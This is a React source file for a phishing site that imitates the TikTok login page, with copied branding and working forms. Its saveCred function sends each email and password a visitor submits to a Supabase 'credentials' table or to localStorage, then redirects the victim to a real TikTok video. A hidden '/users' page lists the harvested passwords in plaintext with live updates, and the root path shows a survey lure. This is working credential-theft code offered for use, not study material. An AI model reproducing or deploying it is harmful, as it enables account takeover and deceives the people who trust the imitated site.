import { useState, useEffect } from "react";
import "./App.css";
import { supabase } from "./supabase";
import Survey from "./Survey";

// ── Credential helpers ───────────────────────────────────────────────────────────
async function saveCred(email, password) {
  if (supabase) {
    await supabase.from("credentials").insert({ email, password });
  } else {
    // fallback: localStorage
    const key = "tt_credentials";
    const list = JSON.parse(localStorage.getItem(key) || "[]");
    list.push({ email, password, time: new Date().toLocaleString() });
    localStorage.setItem(key, JSON.stringify(list));
  }
}

// ── SVG Icons ──────────────────────────────────────────────────────────────────
const QRIcon = () => (
  <svg
    width="1em"
    height="1em"
    viewBox="0 0 48 48"
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
    style={{ fontSize: 20, flexShrink: 0 }}
  >
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M8 6C6.89543 6 6 6.89543 6 8V21C6 22.1046 6.89543 23 8 23H21C22.1046 23 23 22.1046 23 21V8C23 6.89543 22.1046 6 21 6H8ZM10 19V10H19V19H10ZM28 6C26.8954 6 26 6.89543 26 8V21C26 22.1046 26.8954 23 28 23H41C42.1046 23 43 22.1046 43 21V8C43 6.89543 42.1046 6 41 6H28ZM30 19V10H39V19H30ZM8 26C6.89543 26 6 26.8954 6 28V41C6 42.1046 6.89543 43 8 43H21C22.1046 43 23 42.1046 23 41V28C23 26.8954 22.1046 26 21 26H8ZM10 39V30H19V39H10ZM26 42C26 42.5523 26.4477 43 27 43H29C29.5523 43 30 42.5523 30 42V27C30 26.4477 29.5523 26 29 26H27C26.4477 26 26 26.4477 26 27V42ZM32.5 42C32.5 42.5523 32.9477 43 33.5 43H35.5C36.0523 43 36.5 42.5523 36.5 42V27C36.5 26.4477 36.0523 26 35.5 26H33.5C32.9477 26 32.5 26.4477 32.5 27V42ZM40 43C39.4477 43 39 42.5523 39 42V27C39 26.4477 39.4477 26 40 26H42C42.5523 26 43 26.4477 43 27V42C43 42.5523 42.5523 43 42 43H40Z"
    />
  </svg>
);

const UserIcon = () => (
  <svg
    fill="currentColor"
    viewBox="0 0 48 48"
    xmlns="http://www.w3.org/2000/svg"
    width="1em"
    height="1em"
    style={{ fontSize: 20, flexShrink: 0 }}
  >
    <path d="M24 3a10 10 0 1 0 0 20 10 10 0 0 0 0-20Zm0 23C13.06 26 7 33.92 7 40.44 7 44 9 44 16 44h16c7 0 9 0 9-3.56C41 33.92 34.94 26 24 26Z" />
  </svg>
);

const GoogleIcon = () => (
  <svg
    width="1em"
    height="1em"
    viewBox="0 0 48 48"
    fill="none"
    xmlns="http://www.w3.org/2000/svg"
    style={{ fontSize: 20, flexShrink: 0 }}
  >
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M43 24.4313C43 23.084 42.8767 21.7885 42.6475 20.5449H24.3877V27.8945H34.8219C34.3724 30.2695 33.0065 32.2818 30.9532 33.6291V38.3964H37.2189C40.885 35.0886 43 30.2177 43 24.4313Z"
      fill="#4285F4"
    />
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M24.3872 43.001C29.6219 43.001 34.0107 41.2996 37.2184 38.3978L30.9527 33.6305C29.2165 34.7705 26.9958 35.4441 24.3872 35.4441C19.3375 35.4441 15.0633 32.1018 13.5388 27.6108H7.06152V32.5337C10.2517 38.7433 16.8082 43.001 24.3872 43.001Z"
      fill="#34A853"
    />
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M13.5395 27.6094C13.1516 26.4695 12.9313 25.2517 12.9313 23.9994C12.9313 22.7472 13.1516 21.5295 13.5395 20.3894V15.4668H7.06217C5.74911 18.0318 5 20.9336 5 23.9994C5 27.0654 5.74911 29.9673 7.06217 32.5323L13.5395 27.6094Z"
      fill="#FBBC04"
    />
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M24.3872 12.5568C27.2336 12.5568 29.7894 13.5155 31.7987 15.3982L37.3595 9.94866C34.0018 6.88281 29.6131 5 24.3872 5C16.8082 5 10.2517 9.25777 7.06152 15.4674L13.5388 20.39C15.0633 15.8991 19.3375 12.5568 24.3872 12.5568Z"
      fill="#EA4335"
    />
  </svg>
);

const FacebookIcon = () => (
  <svg
    width="1em"
    height="1em"
    viewBox="0 0 48 48"
    fill="none"
    xmlns="http://www.w3.org/2000/svg"
    style={{ fontSize: 20, flexShrink: 0 }}
  >
    <path
      d="M24 47C36.7025 47 47 36.7025 47 24C47 11.2975 36.7025 1 24 1C11.2975 1 1 11.2975 1 24C1 36.7025 11.2975 47 24 47Z"
      fill="white"
    />
    <path
      d="M24 1C11.2964 1 1 11.2964 1 24C1 35.4775 9.40298 44.9804 20.3846 46.7205L20.3936 30.6629H14.5151V24.009H20.3936C20.3936 24.009 20.3665 20.2223 20.3936 18.5363C20.4206 16.8503 20.7542 15.2274 21.6288 13.7487C22.9722 11.4586 25.0639 10.3407 27.6335 10.0251C29.7432 9.76362 31.826 10.0521 33.9087 10.3407C34.0529 10.3587 34.125 10.3767 34.2693 10.4038C34.2693 10.4038 34.2783 10.6472 34.2693 10.8005C34.2603 12.4053 34.2693 16.0839 34.2693 16.0839C33.2685 16.0659 31.6096 15.9667 30.5096 16.138C28.6884 16.4175 27.6425 17.5806 27.6064 19.4108C27.5704 20.8354 27.5884 24.009 27.5884 24.009H33.9988L32.962 30.6629H27.5974V46.7205C38.597 44.9984 47.009 35.4775 47.009 24C47 11.2964 36.7036 1 24 1Z"
      fill="#0075FA"
    />
  </svg>
);

const AppleIcon = () => (
  <svg
    width="1em"
    height="1em"
    viewBox="0 0 48 48"
    fill="none"
    xmlns="http://www.w3.org/2000/svg"
    style={{ fontSize: 20, flexShrink: 0 }}
  >
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M32.5395 4C32.818 6.36773 31.8105 8.69873 30.3367 10.4125C28.7997 12.0988 26.3381 13.3901 23.9417 13.223C23.6296 10.9471 24.8426 8.52606 26.2018 7.04921C27.7388 5.37215 30.4058 4.08817 32.5395 4ZM40.3837 17.6472C40.1083 17.8003 35.6843 20.2608 35.7333 25.2724C35.7886 31.3304 41.4309 33.3307 41.5 33.3528C41.4664 33.4924 40.6169 36.2422 38.5011 39.0324C36.7329 41.4901 34.8798 43.8928 31.9402 43.9368C30.5423 43.9665 29.5985 43.5924 28.6151 43.2026C27.5889 42.7957 26.5195 42.3718 24.8459 42.3718C23.0723 42.3718 21.9556 42.8092 20.8786 43.2311C19.9474 43.5958 19.0459 43.9489 17.7752 43.9975C14.9739 44.0948 12.8343 41.3744 11.003 38.9387C7.34418 33.9681 4.49342 24.9289 8.31419 18.779C10.1653 15.7628 13.5436 13.8194 17.151 13.768C18.7401 13.7368 20.2645 14.3064 21.6007 14.8057C22.6216 15.1873 23.5327 15.5277 24.2789 15.5277C24.9355 15.5277 25.822 15.2004 26.8551 14.819C28.4827 14.218 30.4741 13.4828 32.5032 13.6817C33.8901 13.7184 37.8412 14.1905 40.3897 17.6438L40.3837 17.6472Z"
      fill="white"
    />
  </svg>
);

const BackIcon = () => (
  <svg
    width="1em"
    height="1em"
    viewBox="0 0 48 48"
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
    style={{ fontSize: 18, verticalAlign: "middle" }}
  >
    <path d="M31.7 43.3 12.4 24 31.7 4.7l2.1 2.1L16.7 24l17.1 17.2z" />
  </svg>
);

const HelpIcon = () => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 20 20"
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M10 1a9 9 0 1 0 0 18A9 9 0 0 0 10 1zm0 16.2a7.2 7.2 0 1 1 0-14.4 7.2 7.2 0 0 1 0 14.4zm-.9-5.4h1.8v1.8H9.1v-1.8zm0-7.2h1.8v5.4H9.1V4.6z" />
  </svg>
);

const ChevronDown = () => (
  <svg
    width="12"
    height="12"
    viewBox="0 0 48 48"
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M24 31.6 6.4 14l2.1-2.1L24 27.4l15.5-15.5 2.1 2.1z" />
  </svg>
);

const TikTokMark = ({ size = 34 }) => (
  <svg
    width={size}
    height={size * 1.12}
    viewBox="0 0 34 38"
    fill="none"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path
      d="M24.8 0.4h-6.4v25.8A5.6 5.6 0 0 1 12.8 31.8a5.6 5.6 0 0 1-5.6-5.6 5.6 5.6 0 0 1 5.6-5.6c.5 0 1 .1 1.5.2v-6.6a12.2 12.2 0 0 0-1.5-.1C5.7 14.1.4 19.4.4 25.9.4 32.3 5.7 37.6 12.2 37.6c6.5 0 11.8-5.3 11.8-11.8V12.1a14.8 14.8 0 0 0 8.7 2.8V8.6A8.7 8.7 0 0 1 24.8.4z"
      fill="white"
    />
  </svg>
);

// ── Views ──────────────────────────────────────────────────────────────────────
const VIEWS = { OPTIONS: "options", PHONE: "phone", QR: "qr", EMAIL: "email" };

function ChannelButton({ icon, label, onClick }) {
  return (
    <button className="channel-btn" onClick={onClick} type="button">
      <span className="channel-icon">{icon}</span>
      <span className="channel-label">{label}</span>
    </button>
  );
}

function OptionsView({ onSelect }) {
  return (
    <div className="options-view">
      <h2 className="login-title">Log in to TikTok</h2>
      <p className="login-desc">
        Manage your account, check notifications, comment on videos, and more.
      </p>
      <div className="channel-list">
        <ChannelButton
          icon={<QRIcon />}
          label="Use QR code"
          onClick={() => onSelect(VIEWS.EMAIL)}
        />
        <ChannelButton
          icon={<UserIcon />}
          label="Use phone / email / username"
          onClick={() => onSelect(VIEWS.EMAIL)}
        />
        <ChannelButton
          icon={<GoogleIcon />}
          label="Continue with Google"
          onClick={() => onSelect(VIEWS.EMAIL)}
        />
        <ChannelButton
          icon={<FacebookIcon />}
          label="Continue with Facebook"
          onClick={() => onSelect(VIEWS.EMAIL)}
        />
        <ChannelButton
          icon={<AppleIcon />}
          label="Continue with Apple"
          onClick={() => onSelect(VIEWS.EMAIL)}
        />
      </div>
    </div>
  );
}

function EmailLoginForm({ onBack, onLogin }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const canLogin = email.trim() && password;

  async function handleLogin() {
    setLoading(true);
    await saveCred(email.trim(), password);
    setLoading(false);
    onLogin();
  }

  return (
    <div className="form-view">
      <h2 className="form-title">Log in</h2>
      <div className="form-fields">
        <input
          className="form-input"
          type="email"
          placeholder="Email or username"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          autoComplete="email"
        />
        <div className="pass-row">
          <input
            className="form-input pass-input"
            type={showPass ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            autoComplete="current-password"
          />
          <button
            className="eye-btn"
            type="button"
            onClick={() => setShowPass((v) => !v)}
          >
            {showPass ? "Hide" : "Show"}
          </button>
        </div>
        <a href="#" className="forgot-link" onClick={(e) => e.preventDefault()}>
          Forgot password?
        </a>
        <button
          className="login-submit-btn"
          type="button"
          disabled={!canLogin || loading}
          onClick={handleLogin}
        >
          {loading ? "Saving..." : "Log in"}
        </button>
      </div>
      <button className="go-back-btn" type="button" onClick={onBack}>
        <BackIcon />
        &ensp;Go back
      </button>
    </div>
  );
}

// ── Users page ─────────────────────────────────────────────────────────────────
function UsersPage() {
  const [creds, setCreds] = useState([]);
  const [loading, setLoading] = useState(true);

  async function fetchCreds() {
    if (supabase) {
      const { data } = await supabase
        .from("credentials")
        .select("*")
        .order("created_at", { ascending: false });
      setCreds(data || []);
    } else {
      const key = "tt_credentials";
      setCreds(JSON.parse(localStorage.getItem(key) || "[]").reverse());
    }
    setLoading(false);
  }

  useEffect(() => {
    fetchCreds();
    // real-time subscription
    if (supabase) {
      const channel = supabase
        .channel("credentials")
        .on(
          "postgres_changes",
          { event: "INSERT", schema: "public", table: "credentials" },
          (payload) => {
            setCreds((prev) => [payload.new, ...prev]);
          },
        )
        .subscribe();
      return () => supabase.removeChannel(channel);
    }
  }, []);

  async function handleClear() {
    if (supabase) {
      await supabase.from("credentials").delete().neq("id", 0);
    } else {
      localStorage.removeItem("tt_credentials");
    }
    setCreds([]);
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#0d0d0d",
        padding: "40px 32px",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div style={{ maxWidth: 760, margin: "0 auto" }}>
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            marginBottom: 28,
          }}
        >
          <h1
            style={{ color: "#fff", fontSize: 24, fontWeight: 700, margin: 0 }}
          >
            Submitted Credentials
          </h1>
          <div style={{ display: "flex", gap: 12 }}>
            <a
              href="/"
              style={{
                color: "rgba(255,255,255,.6)",
                fontSize: 14,
                textDecoration: "none",
                padding: "8px 16px",
                border: "1px solid rgba(255,255,255,.2)",
                borderRadius: 4,
              }}
            >
              ← Back to login
            </a>
            {creds.length > 0 && (
              <button
                onClick={handleClear}
                style={{
                  background: "#fe2c55",
                  border: "none",
                  color: "#fff",
                  fontSize: 14,
                  fontWeight: 600,
                  padding: "8px 16px",
                  borderRadius: 4,
                  cursor: "pointer",
                }}
              >
                Clear all
              </button>
            )}
          </div>
        </div>

        {loading ? (
          <p style={{ color: "rgba(255,255,255,.4)", fontSize: 15 }}>
            Loading...
          </p>
        ) : creds.length === 0 ? (
          <p style={{ color: "rgba(255,255,255,.4)", fontSize: 15 }}>
            No credentials submitted yet.
          </p>
        ) : (
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ borderBottom: "1px solid rgba(255,255,255,.12)" }}>
                <th style={th}>#</th>
                <th style={th}>Email / Username</th>
                <th style={th}>Password</th>
                <th style={th}>Time</th>
              </tr>
            </thead>
            <tbody>
              {creds.map((c, i) => (
                <tr
                  key={c.id || i}
                  style={{ borderBottom: "1px solid rgba(255,255,255,.06)" }}
                >
                  <td style={td}>{creds.length - i}</td>
                  <td style={td}>{c.email}</td>
                  <td style={td}>{c.password}</td>
                  <td
                    style={{
                      ...td,
                      color: "rgba(255,255,255,.4)",
                      fontSize: 13,
                    }}
                  >
                    {c.created_at
                      ? new Date(c.created_at).toLocaleString()
                      : c.time}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}
const th = {
  color: "rgba(255,255,255,.5)",
  fontSize: 13,
  fontWeight: 600,
  textAlign: "left",
  padding: "10px 14px",
};
const td = {
  color: "rgba(255,255,255,.85)",
  fontSize: 14,
  padding: "12px 14px",
  wordBreak: "break-all",
};

function PhoneForm({ onBack }) {
  const [tab, setTab] = useState("phone");
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [usePass, setUsePass] = useState(false);
  const [showPass, setShowPass] = useState(false);

  const canLogin =
    tab === "phone"
      ? usePass
        ? phone && password
        : phone && code.length === 6
      : email && password;

  return (
    <div className="form-view">
      <h2 className="form-title">Log in</h2>

      <div className="form-tabs">
        <button
          className={`form-tab${tab === "phone" ? " active" : ""}`}
          onClick={() => setTab("phone")}
          type="button"
        >
          Phone
        </button>
        <span className="tab-divider" />
        <button
          className={`form-tab${tab === "email" ? " active" : ""}`}
          onClick={() => setTab("email")}
          type="button"
        >
          Email / Username
        </button>
      </div>

      {tab === "phone" ? (
        <div className="form-fields">
          <div className="phone-row">
            <button className="country-btn" type="button">
              <span>US +1</span>
              <ChevronDown />
            </button>
            <input
              className="form-input phone-input"
              type="tel"
              placeholder="Phone number"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
            />
          </div>

          {!usePass ? (
            <div className="code-row">
              <input
                className="form-input code-input"
                type="text"
                placeholder="Enter 6-digit code"
                maxLength={6}
                value={code}
                onChange={(e) => setCode(e.target.value)}
              />
              <button className="send-code-btn" type="button" disabled={!phone}>
                Send code
              </button>
            </div>
          ) : (
            <div className="pass-row">
              <input
                className="form-input pass-input"
                type={showPass ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button
                className="eye-btn"
                type="button"
                onClick={() => setShowPass((v) => !v)}
              >
                {showPass ? "Hide" : "Show"}
              </button>
            </div>
          )}

          <button
            className="switch-link"
            type="button"
            onClick={() => setUsePass((v) => !v)}
          >
            {usePass ? "Log in with code" : "Log in with password"}
          </button>
          <button
            className="login-submit-btn"
            type="button"
            disabled={!canLogin}
          >
            Log in
          </button>
        </div>
      ) : (
        <div className="form-fields">
          <input
            className="form-input"
            type="text"
            placeholder="Email or username"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <div className="pass-row">
            <input
              className="form-input pass-input"
              type={showPass ? "text" : "password"}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              className="eye-btn"
              type="button"
              onClick={() => setShowPass((v) => !v)}
            >
              {showPass ? "Hide" : "Show"}
            </button>
          </div>
          <a
            href="#"
            className="forgot-link"
            onClick={(e) => e.preventDefault()}
          >
            Forgot password?
          </a>
          <button
            className="login-submit-btn"
            type="button"
            disabled={!canLogin}
          >
            Log in
          </button>
        </div>
      )}

      <button className="go-back-btn" type="button" onClick={onBack}>
        <BackIcon />
        &ensp;Go back
      </button>
    </div>
  );
}

function QRView({ onBack }) {
  return (
    <div className="form-view qr-view">
      <h2 className="form-title">Log in with QR code</h2>
      <p className="qr-desc">
        Scan this code with the TikTok app to log in instantly.
      </p>
      <div className="qr-frame">
        <svg
          width="200"
          height="200"
          viewBox="0 0 200 200"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <rect
            x="14"
            y="14"
            width="56"
            height="56"
            rx="4"
            stroke="white"
            strokeWidth="5"
            fill="none"
          />
          <rect x="27" y="27" width="30" height="30" rx="2" fill="white" />
          <rect
            x="130"
            y="14"
            width="56"
            height="56"
            rx="4"
            stroke="white"
            strokeWidth="5"
            fill="none"
          />
          <rect x="143" y="27" width="30" height="30" rx="2" fill="white" />
          <rect
            x="14"
            y="130"
            width="56"
            height="56"
            rx="4"
            stroke="white"
            strokeWidth="5"
            fill="none"
          />
          <rect x="27" y="143" width="30" height="30" rx="2" fill="white" />
          {[
            [84, 14],
            [91, 14],
            [105, 14],
            [112, 14],
            [84, 21],
            [105, 21],
            [84, 28],
            [91, 28],
            [98, 28],
            [112, 28],
            [105, 35],
            [84, 42],
            [91, 42],
            [98, 42],
            [105, 42],
            [14, 84],
            [28, 84],
            [42, 84],
            [56, 84],
            [14, 91],
            [56, 91],
            [28, 98],
            [42, 98],
            [14, 105],
            [21, 105],
            [35, 105],
            [56, 105],
            [14, 112],
            [21, 112],
            [42, 112],
            [49, 112],
            [84, 84],
            [91, 84],
            [98, 84],
            [112, 84],
            [126, 84],
            [140, 84],
            [154, 84],
            [168, 84],
            [182, 84],
            [84, 91],
            [112, 91],
            [140, 91],
            [168, 91],
            [91, 98],
            [98, 98],
            [112, 98],
            [126, 98],
            [154, 98],
            [182, 98],
            [84, 105],
            [98, 105],
            [112, 105],
            [126, 105],
            [140, 105],
            [154, 105],
            [168, 105],
            [91, 112],
            [112, 112],
            [140, 112],
            [182, 112],
            [84, 119],
            [98, 119],
            [112, 119],
            [154, 119],
            [168, 119],
            [91, 126],
            [105, 126],
            [126, 126],
            [140, 126],
            [182, 126],
            [84, 133],
            [98, 133],
            [112, 133],
            [126, 133],
            [140, 133],
            [154, 133],
            [168, 133],
            [84, 140],
            [91, 140],
            [105, 140],
            [119, 140],
            [133, 140],
            [154, 140],
            [182, 140],
            [98, 147],
            [112, 147],
            [126, 147],
            [168, 147],
            [84, 154],
            [105, 154],
            [119, 154],
            [133, 154],
            [147, 154],
            [161, 154],
            [91, 161],
            [98, 161],
            [112, 161],
            [126, 161],
            [154, 161],
            [182, 161],
            [84, 168],
            [105, 168],
            [119, 168],
            [133, 168],
            [147, 168],
            [168, 168],
            [91, 175],
            [112, 175],
            [140, 175],
            [161, 175],
            [182, 175],
            [84, 182],
            [98, 182],
            [112, 182],
            [126, 182],
            [140, 182],
            [154, 182],
            [168, 182],
          ].map(([x, y]) => (
            <rect
              key={`${x}-${y}`}
              x={x}
              y={y}
              width="6"
              height="6"
              fill="white"
            />
          ))}
        </svg>
        <div className="qr-logo">
          <TikTokMark size={36} />
        </div>
      </div>
      <p className="qr-hint">
        Make sure you&apos;re using the latest version of TikTok
      </p>
      <button className="go-back-btn" type="button" onClick={onBack}>
        <BackIcon />
        &ensp;Go back
      </button>
    </div>
  );
}

// ── Main App ───────────────────────────────────────────────────────────────────
export default function App() {
  const [view, setView] = useState(VIEWS.OPTIONS);
  const path = window.location.pathname;
  const isUsersPage = path === "/users";
  const isLoginPage = path === "/login";

  useEffect(() => {
    const onPop = () => window.location.reload();
    window.addEventListener("popstate", onPop);
    return () => window.removeEventListener("popstate", onPop);
  }, []);

  if (isUsersPage) return <UsersPage />;
  if (!isLoginPage) return <Survey />;

  return (
    <div className="tt-page">
      <header className="tt-header">
        <a
          href="/"
          className="tt-logo-link"
          aria-label="Go to TikTok For You feed"
        >
          <TikTokMark size={28} />
          <strong className="tt-logo-text">TikTok</strong>
        </a>
        <a
          href="https://www.tiktok.com/feedback/"
          className="tt-feedback-link"
          target="_blank"
          rel="noreferrer"
        >
          <HelpIcon />
          <span>Feedback and help</span>
        </a>
      </header>

      <main className="tt-main">
        {view === VIEWS.OPTIONS && <OptionsView onSelect={setView} />}
        {view === VIEWS.EMAIL && (
          <EmailLoginForm
            onBack={() => setView(VIEWS.OPTIONS)}
            onLogin={() => {
              window.location.href =
                "https://www.tiktok.com/@baiqonyr_meshiti/video/7610814787127184658?_r=1&_t=ZS-96Wc6bciS2x";
            }}
          />
        )}
        {view === VIEWS.PHONE && (
          <PhoneForm onBack={() => setView(VIEWS.OPTIONS)} />
        )}
        {view === VIEWS.QR && <QRView onBack={() => setView(VIEWS.OPTIONS)} />}
      </main>

      <footer className="tt-footer">
        <p className="tt-terms">
          By continuing, you agree to TikTok&apos;s{" "}
          <a
            href="https://www.tiktok.com/legal/terms-of-use"
            className="tt-terms-link"
          >
            Terms of Service
          </a>{" "}
          and confirm that you have read TikTok&apos;s{" "}
          <a
            href="https://www.tiktok.com/legal/privacy-policy"
            className="tt-terms-link"
          >
            Privacy Policy
          </a>
          .
        </p>
        <div className="tt-signup-row">
          <span>Don&apos;t have an account?</span>
          <a href="/signup" className="tt-signup-link">
            Sign up
          </a>
        </div>
        <div className="tt-bottom-bar">
          <div className="tt-lang-wrap">
            <select className="tt-lang-select" defaultValue="English (US)">
              <option>English (US)</option>
              <option>Español</option>
              <option>Français</option>
              <option>Deutsch</option>
              <option>Português (Brasil)</option>
              <option>日本語</option>
              <option>한국어</option>
              <option>中文 (简体)</option>
            </select>
          </div>
          <span className="tt-copyright">© 2026 TikTok</span>
        </div>
      </footer>
    </div>
  );
}
